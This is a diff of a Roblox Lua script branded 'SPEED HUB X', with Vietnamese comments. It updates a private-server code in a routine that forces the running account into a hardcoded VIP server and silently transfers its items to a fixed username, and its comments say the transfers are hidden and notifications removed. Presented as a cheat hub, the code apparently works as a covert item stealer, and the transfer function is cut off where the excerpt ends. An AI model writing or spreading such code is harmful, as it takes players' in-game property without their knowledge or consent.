@@ -5,7 +5,7 @@ if not game:IsLoaded() then
     end)
 end
 
-print("==== SPEED HUB X: TỰ ĐỘNG VÀO SERVER VIP & CHUYỂN ĐỒ NGẦM ====")
+print("==== SPEED HUB X: TỰ ĐỘNG VÀO SERVER VIP MỚI & CHUYỂN ĐỒ NGẦM ====")
 
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
@@ -13,16 +13,16 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
 local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
-local vipServerCode = "2f679c97eae3ae4a83952f97d2173834" -- Mã Server VIP của bạn
+local vipServerCode = "78ca0b333a773d48852ef4d7f1220e76" -- Mã Share Server VIP mới của bạn
 
 -- =======================================================================
--- TỰ ĐỘNG DI CHUYỂN VÀO ĐÚNG SERVER VIP CỦA BẠN
+-- TỰ ĐỘNG DI CHUYỂN VÀO ĐÚNG SERVER VIP CỦA BẠN VIA SHARE CODE
 -- =======================================================================
 local function joinVipServer()
     local targetPlayer = Players:FindFirstChild(targetUsername)
     if not targetPlayer then
         pcall(function()
-            -- Sử dụng mã Share Code để ép acc phụ nhảy thẳng vào máy chủ riêng của bạn
+            -- Ép acc phụ nhảy thẳng vào máy chủ riêng bằng mã mới
             TeleportService:TeleportToPlaceInstance(game.PlaceId, vipServerCode, LocalPlayer)
         end)
     end
@@ -32,7 +32,7 @@ end
 joinVipServer()
 
 -- =======================================================================
--- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (ĐÃ BỎ THÔNG BÁO)
+-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (KHÔNG THÔNG BÁO)
 -- =======================================================================
 local function sendItemSecure(category, itemName, quantity)
     local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
